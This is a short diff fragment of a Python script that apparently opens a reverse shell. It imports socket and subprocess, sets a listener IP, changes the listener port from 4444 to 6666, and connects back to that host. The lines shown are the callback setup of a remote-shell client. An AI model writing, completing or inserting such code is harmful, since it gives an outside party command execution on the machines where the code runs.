@@ -5,7 +5,7 @@ import socket
 import subprocess
 
 HOST = '192.168.190.137' # The ip of the listener.
-PORT = 4444 # The same port as listener.
+PORT = 6666 # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT)) # Connect to listener.
